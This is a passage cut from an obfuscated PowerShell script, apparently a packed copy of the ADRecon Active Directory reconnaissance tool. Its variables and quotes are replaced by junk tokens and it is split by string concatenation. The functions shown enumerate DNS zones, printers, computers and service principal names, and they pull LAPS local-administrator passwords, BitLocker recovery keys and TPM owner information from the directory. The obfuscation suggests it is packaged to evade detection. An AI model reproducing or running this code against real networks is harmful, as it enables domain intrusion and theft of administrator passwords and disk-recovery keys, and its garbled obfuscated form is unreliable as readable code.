                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name USNChanged -Value 5I7EL_.usnchanged
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name whenCreated -Value 5I7EL_.whenCreated
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name whenChanged -Value 5I7EL_.whenChanged
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name DistinguishedName -Value 5I7EL_.DistinguishedName
                5I7ELADDNSZonesObj += 5I7ELObj
            }
            Write-Verbose I2aj[*] Total DNS Records: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADDNSNodesObj))I2aj
            Remove-Variable DNSZoneArray
        }
    }

    If (5I7ELMet'+'hod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajnameI2aj,I2ajwhencreatedI2aj,I2ajwhenchangedI2aj,I2ajusncreatedI2aj,I2ajusnchangedI2aj,I2ajdistinguishednameI2aj))
        5I7ELObjSearcher.Filter = I2aj(objectClass=dnsZone)I2aj
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADDNSZones = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDNSZone] Error while enumerating dnsZone ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        5I7ELObjSearcher.dispose()

        5I7ELDNSZoneArray = @()
        If (5I7ELADDNSZones)
        {
            5I7ELDNSZoneArray += 5I7ELADDNSZones
            Remove-Variable ADDNSZones
        }

        5I7ELSearchPath = I2ajDC=DomainDnsZonesI2aj
        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I'+'7EL(5I7ELSearchPath),5I7EL(5I7ELobjDomain.distinguishedNam'+'e)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
        }
        Else
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELSearchPath),5I7EL(5I7ELobjDomain.distinguishedName)I2aj
        }
        5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
        5I7ELobjSearcherPath.Filter = I2aj(objectClass=dnsZone)I2aj
        5I7ELobjSearcherPath.PageSize = 5I7ELPageSize
        5I7ELobjSearcherPath.PropertiesToLoad.AddRange((I2ajnameI2aj,I2ajwhencreatedI2aj,I2ajwhenchangedI2aj,I2ajusncreatedI2aj,I2ajusnchangedI2aj,I2ajdistinguishednameI2aj))
        5I7ELobjSearcherPath.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADDNSZones1 = 5I7ELobjSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDNSZone] Error while enumerating 5I7EL(5I7ELSearchPath),5I7EL(5I7ELobjDomain.distinguishedName) dnsZone Objects.I2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        5I7ELobjSearcherPath.dispose()

 '+'       If (5I7ELADDNSZones1)
        {
            5I7ELDNSZoneArray += 5I7ELADDNSZones1
            Remove-Variable ADDNSZones1
        }

        5I7ELSearchPath = I2ajDC=ForestDnsZonesI2aj
        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELDomainFQDN = Get-DNtoFQDN(5I7ELobjDomain.distinguishedName)
            5I7ELDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajDomainI2aj,5I7EL(5I7ELDomainFQDN),5I7EL(5I7ELCredential.UserName),5'+'I7EL(5I7ELCredential.GetNetworkCredential().password))
            Try
            {
                5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(5I7ELDomainContext)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRForest] Error getting Domain ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            Remove-Variable DomainContext
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7EL(5I7ELSearchPath),DC=5I7EL(5I7ELADDomain.Forest.Name -replace JQTOyCOlhg.JQTOy,JQTOy,DC=JQTOy)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
        }
        Else
        {
            5I7ELADDomain = [Syst'+'em.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELSearchPath),DC=5I7EL(5I7ELADDomain.Forest.Name -replace JQTOyCOlhg.JQTOy,JQTOy,DC=JQTOy)I2aj
        }

        5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
        5I7ELobjSearcherPath.Filter = I2aj(objectClass=dnsZone)I2aj
        5I7ELobjSearcherPath.PageSize = 5I7ELPageSize
        5I7ELobjSearcherPath.PropertiesToLoad.AddRange((I2ajnameI2aj,I2ajwhencreatedI2aj,I2ajwhenchangedI2aj,I2ajusncreatedI2aj,I2ajusnchangedI2aj,I2ajdistinguishednameI2aj))
        5I7ELobjSearcherPath.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADDNSZones2 = 5I7ELobjSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDNSZone] Error while enumerating 5I7EL(5I7ELSearchPath),DC=5I7EL(5I7ELADDomain.Forest.Name -replace JQTOyCOlhg.JQTOy,JQTOy,DC=JQTOy) dnsZone Objects.I2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        5I7ELobjSearcherPath.dispose()

        If (5I7ELADDNSZones2)
        {
            5I7ELDNSZoneArray += 5I7ELADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If(5I7ELADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose I2aj[*] Total DNS Zones: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELDNSZoneArray))I2aj

        If (5I7ELDNSZoneArray)
        {
            5I7ELADDNSZonesObj = @()
            5I7ELADDNSNodesObj = @()
            5I7ELDNSZoneArray Ok6rl ForEach-Object {
                If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
                {
                    5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7EL(5I7EL_.Properties.distinguishedname)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                }
                Else
                {
                    5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7EL_.Properties.distinguishedname)I2aj
                }
                5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
                5I7ELobjSearcherPath.Filter = I2aj(objectClass=dnsNode)I2aj
                5I7ELobjSearcherPath.PageSize = 5I7ELPageSize
                5I7ELobjSearcherPath.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj,I2ajdnsrecordI2aj,I2ajnameI2aj,I2ajdcI2aj,I2ajshowinadvancedviewonlyI2aj,I2ajwhenchangedI2aj,I2ajwhencreatedI2aj))
                Try
                {
                    5I7ELDNSNodes = 5I7ELobjSearcherPath.FindAll()
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRDNSZone] Error while enumerating 5I7EL(5I7EL_.Properties.distinguishedname) dnsNode ObjectsI2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                }
                5I7ELobjSearcherPath.dispose()
                Remove-Variable objSearchPath

                
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name Name -Value 5I7EL([ADRecon.LDAPClass]::CleanString(5I7EL_.Properties.name[0]))
                If (5I7ELDNSNodes)
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name RecordCount -Value 5I7EL(5I7ELDNSNodes Ok6rl Measure-Object Ok6rl Select-Object -ExpandProperty Count)
                    5I7ELDNSNodes Ok6rl ForEach-Object {
                        5I7ELObjNode = New-Object PSObject
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name ZoneName -Value 5I7ELObj.Name
                        5I7ELname = ([string] 5I7EL(5I7EL_.Properties.name))
                        If (-Not 5I7ELname)
                        {
                            5I7ELname = ([string] 5I7EL(5I7EL_.Properties.dc))
                        }
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name Name -Value 5I7ELname
                        Try
                        {
                            5I7ELDNSRecord = Convert-DNSRecord 5I7EL_.Properties.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning I2aj[Get-ADRDNSZone] Error while converting the DNSRecordI2aj
                            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                        }
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name RecordType -Value 5I7ELDNSRecord.RecordType
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name Data -Value 5I7ELDNSRecord.Data
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name TTL -Value 5I7ELDNSRecord.TTL
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name Age -Value 5I7ELDNSRecord.Age
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name TimeStamp -Value 5I7ELDNSRecord.TimeStamp
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value 5I7ELDNSRecord.UpdatedAtSerial
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] 5I7EL(5I7EL_.Properties.whencreated))
                    '+'    5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] 5I7EL(5I7EL_.Properties.whenchanged))
                        
                        
                        
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value ([string] 5I7EL(5I7EL_.Properties.showinadvancedviewonly))
                        5I7ELObjNode Ok6rl Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] 5I7EL(5I7EL_.Properties.distinguishedname))
                        5I7ELADDNSNodesObj += 5I7ELObjNode
                        If (5I7ELDNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name RecordCount -Value 5I7ELnull
                }
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name USNCreated -Value ([string] 5I7EL(5I7EL_.Properties.usncreated))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name USNChanged -Value ([string] 5I7EL(5I7EL_.Properties.usnchanged))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] 5I7EL(5I7EL_.Properties.whencreated))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] 5I7EL(5I7EL_.Properties.whenchanged))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] 5I7EL(5I7EL_.Properties.distinguishedname))
                5I7ELADDNSZonesObj += 5I7ELObj
            }
            Write-Verbose I2aj[*] Total DNS Records: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADDNSNodesObj))I2aj
            Remove-Variable DNSZoneArray
        }
    }

    If (5I7ELADDNSZonesObj -and 5I7ELADRDNSZones)
    {
        Export-ADR 5I7ELADDNSZonesObj 5I7ELADROutputDir 5I7ELOutputType I2ajDNSZonesI2aj
        Remove-Variable ADDNSZonesObj
    }

    If (5I7ELADDNSNodesObj -and 5I7ELADRDNSRecords)
    {
        Export-ADR 5I7ELADDNSNodesObj 5I7ELADROutputDir 5I7ELOutputType I2ajDNSNodesI2aj
        Remove-Variable ADDNSNodesObj
    }
}

Function Get-ADRPrinter
{


    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)'+']
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads '+'= 10
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADPrinters = @( Get-ADObject -LDAPFilter JQTOy(objectCategory=printQueue)JQTOy -Properties driverName,driverVersion,Name,portName,printShareName,serverName,url,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRPrinter] Error while enumerating printQueue ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADPrinters)
        {
            Write-Verbose I2aj[*] Total Printers: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADPrinters))I2aj
            5I7ELPrintersObj = [ADRecon.ADWSClass]::PrinterParser(5I7ELADPrinters, 5I7ELThreads)
            Remove-Variable ADPrinters
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectCategory=printQueue)I2aj
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADPrinters = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRPrinter] Error while enumerating printQueue ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADPrinters)
        {
            5I7ELcnt = 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADPrinters))
            If (5I7ELcnt -ge 1)
            {
                Write-Verbose I2aj[*] Total Printers: 5I7ELcntI2aj
                5I7ELPrintersObj = [ADRecon.LDAPClass]::PrinterParser(5I7ELADPrinters, 5I7ELThreads)
          '+'  }
            Remove-Variable ADPrinters
        }
    }

    If (5I7ELPrintersObj)
    {
        Return 5I7ELPrintersObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRComputer
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELtrue)]
        [DateTime] 5I7ELdate,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELDormantTimeSpan = 90,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPassMaxAge = 30,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Pa'+'rameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELADRComputers = 5I7ELtrue,

        [Parameter(Mandatory = '+'5I7ELfalse)]
        [int] 5I7ELADRComputerSPNs = 5I7ELfalse
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        If (!5I7ELADRComputers)
        {
            Try
            {
                5I7ELADComputers = @( Get-ADObject -LDAPFilter I2aj(&(samAccountType=805306369)(servicePrincipalName=*))I2aj -ResultPageSize 5I7ELPageSize -Properties Name,servicePrincipalName )
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRComputer] Error while enumerating ComputerSPN ObjectsI2aj
               '+' Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
        }
        Else
        {
            Try
            {
                5I7ELADComputers = @( Get-ADComputer -Filter * -ResultPageSize 5I7ELPageSize -Properties Description,DistinguishedName,DNSHostName,Enabled,IPv4Address,LastLogonDate,JQTOymsDS-AllowedToDelegateToJQTOy,JQTOyms-ds-CreatorSidJQTOy,JQTOymsDS-SupportedEncryptionTypesJQTOy,Name,OperatingSystem,OperatingSystemHotfix,OperatingSystemServicePack,OperatingSystemVersion,PasswordLastSet,primaryGroupID,SamAccountName,servicePrincipalName,SID,SIDHistory,TrustedForDelegation,TrustedToAuthForDelegation,UserAccountControl,whenChange'+'d,whenCreated )
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRComputer] Error while enumerating Computer ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL'+'(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
        }
        If (5I7ELADComputers)
        {
            Write-Verbose I2aj[*] Total Computers: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADComputers))I2aj
            If (5I7ELADRComputers)
            {
                5I7ELComputerObj = [ADRecon.ADWSClass'+']::ComputerParser(5I7ELADComputers, 5I7ELdate, 5I7ELDormantTimeSpan, 5I7ELPassMaxAge, 5I7ELThreads)
            }
            If (5I7ELADRComputerSPNs)
            {
                5I7ELComputerSPNObj = [ADRecon.ADWSClass]::ComputerSPNParser(5I7ELADComputers, 5I7ELThreads)'+'
            }
            Remove-Variable ADComputers
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        If (!5I7ELADRComputers)
        {
            5I7ELobjSearcher = New-Object System.DirectorySer'+'vices.DirectorySearcher 5I7ELobjDomain
            5I7ELObjSearcher.PageSize = 5I7ELPageSize
            5I7ELObjSearcher.Filter = I2aj(&(samAccountType=805306369)(servicePrincipalName=*))I2aj
            5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajnameI2aj,I2ajserviceprincipalnameI2aj))
            5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj
            Try
            {
                5I7ELADComputers = 5I7ELObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRComputer] Error while enumerating ComputerSPN ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            5'+'I7ELObjSearcher.dispose()
        }
        Else
        {
            5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
            5I7ELObjSearcher.PageSize = 5I7ELPageSize
            5I7ELObjSearcher.Filter = I2aj(samAccountType=805306369)I2aj
            5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdescriptionI2aj,I2ajdistinguishednameI2aj,I2ajdnshostnameI2aj,I2ajlastlogontimestampI2aj,I2ajmsDS-AllowedToDelegateToI2aj,I2ajms-ds-CreatorSidI2aj,I2ajmsDS-SupportedEncryptionTypesI2aj,I2ajnameI2aj,I2ajobjectsidI2aj,I2ajoperatingsystemI2aj,I2ajoperatingsystemhotfixI2aj,I2ajoperatingsystemservicepackI2aj,I2ajoperatingsystemversionI2aj,I2ajprimarygroupidI2aj,I2ajpwdlastsetI2aj,I2ajsamaccountnameI2aj,I2ajserviceprincipalnameI2aj,I2ajsidhistoryI2aj,I2ajuseraccountcontrolI2aj,I2ajwhenchangedI2aj,I2ajwhencreatedI2aj))
            5I7ELObjSearcher.Sear'+'chScope = I2ajSubtreeI2aj

            Try
            {
                5I7ELADComputers = 5I7ELObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRComputer] '+'Error while enumerating Computer ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            5I7ELObjSearcher.dispose()
        }

        If (5I7ELADComputers)
        {
            Write-Verbose I2aj[*] Total Computers: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADComputers))I2aj
            If (5I7ELADRComputers)
            {
                5I7ELComputerObj = [ADRecon.LDAPClass]::ComputerParser(5I7ELADComputers, 5I7ELdate, 5I7ELDormantTimeSpan, 5I7ELPassMaxAge, 5I7ELThreads)
            }
            If (5I7ELADRComputerSPNs)
            {
                5I7ELComputerSPNObj = [ADRecon.LDAPClass]::ComputerSPNParser(5I7ELADComputers, '+'5I7ELThreads)
            }
            Remove-Variable ADComputers
        }
    }

    If (5I7ELComputerObj)
    {
        Export-ADR -ADRObj 5I7ELComputerObj -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajComputersI2aj
        Remove-Variable ComputerObj
    }
    If (5I7ELComputerSPNObj)
    {
        Export-ADR -ADRObj 5I7ELComputerSPNObj -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajComputerSPNsI2aj
        Remove-Variable ComputerSPNObj
    }
}


Function Get-ADRLAPSCheck
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADComputers = @( Get-ADObject -LDAPFilter I2aj(samAccountType=805306369)I2aj -Properties CN,DNSHostName,JQTOyms-Mcs-AdmPwdJQT'+'Oy,JQTOyms-Mcs-AdmPwdExpirationTimeJQTOy -ResultPageSize 5I7ELPageSize )
        }
        Catch [System.ArgumentException]
        {
            Write-Warning I2aj[*] LAPS is not implemented.I2aj
            Return 5I7ELnull
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRLAPSCheck] Error while enumerating LAPS ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADComputers)
        {
            Write-Verbose I2aj[*] Total LAPS Objects: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADComputers))I2aj
            5I7ELLAPSObj = [ADRecon.ADWSClass]::LAPSParser(5I7ELADComputers, 5I7ELThreads)
            Remove-Variable ADComputers
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(samAccountType=805306369)I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajcnI2aj,I2ajdnshostnameI2aj,I2ajms-mcs-admpwdI2aj,I2ajms-mcs-admpwdexpirationtimeI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj
        Try
        {
            5I7ELADComputers = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRLAPSCheck] Error while enumerating LAPS ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADComputers)
        {
            5I7ELLAPSCheck = [ADRecon.LDAPClass]::LAPSCheck(5I7ELADComputers)
            If (-Not 5I7ELLAPSCheck)
            {
                Write-Warning I2aj[*] LAPS is not implemented.I2aj
                Return 5I7ELnull
            }
            Else
            {
    '+'            Write-Verbose I2aj[*] Total LAPS Objects: 5I7EL([ADRecon.LDAPClass]::Obj'+'ectCount(5I7ELADComputers))I2aj
                5I7ELLAPSObj = [ADRecon.LDAPClass]::LAPSParser(5I7ELADComputers, 5I7ELThreads)
                Remove-Variable ADComputers
            }
        }
    }

    If (5I7ELLAPSObj)
    {
        Return 5I7ELLAPSObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRBitLocker
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADBitLockerRecoveryKeys = Get-ADObject -LDAPFilter JQTOy(objectClass=msFVE-RecoveryInformation)JQTOy -Properties distinguishedName,msFVE-RecoveryPassword,msFVE-RecoveryGuid,msFVE-VolumeGuid,Name,whenCreated
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRBitLocker] Error while enumerating msFVE-RecoveryInformation ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADBitLockerRecoveryKeys)
        {
            5I7ELcnt = 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADBitLockerRecoveryKeys))
            If (5I7ELcnt -ge 1)
            {
                Write-Verbose I2aj[*] Total BitLocker Recovery Keys: 5I7ELcntI2aj
                5I7ELBitLockerObj = @()
                5I7ELADBitLockerRecoveryKeys Ok6rl ForEach-Object {
                    
                    5I7ELObj = New-Object PSObject
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajDistinguished NameI2aj -Value 5I7EL(((5I7EL_.distinguishedName -split JQTOy}JQTOy)[1]).substring(1))
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajNameI2aj -Value 5I7EL_.Name
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenCreatedI2aj -Value 5I7EL_.whenCreated
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajRecovery Key IDI2aj -Value 5I7EL([GUID] 5I7EL_.JQTOymsFVE-RecoveryGuidJQTOy)
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajRecovery KeyI2aj -Value 5I7EL_.JQTOymsFVE-RecoveryPasswordJQTOy
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajVolume GUIDI2aj -Value 5I7EL([GUID] 5I7EL_.JQTOymsFVE-VolumeGuidJQTOy)
                    Try
                    {
                        5I7ELTempComp = Get-ADComputer -Identity 5I7ELObj.JQTOyDistinguished NameJQTOy -Properties msTPM-OwnerInformation,msTPM-TpmInformationForComputer
                    }
                    Catch
                    {
                        Write-Warning I2aj[Get-ADRBitLocker] Error while enumerating 5I7EL(5I7ELObj.JQTOyDistinguished NameJQTOy) Computer ObjectI2aj
                        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                    }
                    If (5I7ELTempComp)
                    {
      '+'                  
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajmsTPM-OwnerInformationI2aj -Value 5I7ELTempComp.JQTOymsTPM-OwnerInformationJQTOy

                        
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajmsTPM-TpmInformationForComputerI2aj -Value 5I7ELTempComp.JQTOymsTPM-TpmInformationForComputerJQTOy
                        If (5I7ELnull -ne 5I7ELTempComp.JQTOymsTPM-TpmInformationForComputerJQTOy)
                        {
                            
                            5I7ELTPMObject = Get-ADObject -Identity 5I7ELTempComp.JQTOymsTPM-TpmInformationForComputerJQTOy -Properties msTPM-OwnerInformation
                            5I7ELTPMRecoveryInfo = 5I7ELTPMObject.JQTOymsTPM-OwnerInformationJQTOy
                        }
                        Else
                        {
                            5I7ELTPMRecoveryInfo = 5I7ELnull
                        }
                    }
                    Else
                    {
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajmsTPM-OwnerInformationI2aj -Value 5I7ELnull
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajmsTPM-TpmInformationForComputerI2aj -Value 5I7ELnull
                        5I7ELTPMRecoveryInfo = 5I7ELnull

                    }
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajTPM Owner PasswordI2aj -Value 5I7ELTPMRecoveryInfo
                    5I7ELBitLockerObj += 5I7ELObj
                }
            }
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
  '+'      5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectClass=msFVE-RecoveryInformation)I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishedNameI2aj,I2ajmsfve-recoverypasswordI2aj,I2ajmsfve-recoveryguidI2aj,I2ajmsfve-volumeguidI2aj,I2ajmstpm-ownerinformationI2aj,I2ajmstpm-tpminformationforcomputerI2aj,I2ajnameI2aj,I2ajwhencreatedI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADBitLockerRecoveryKeys = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRBitLocker] Error while enumerating msFVE-RecoveryInformation ObjectsI2aj
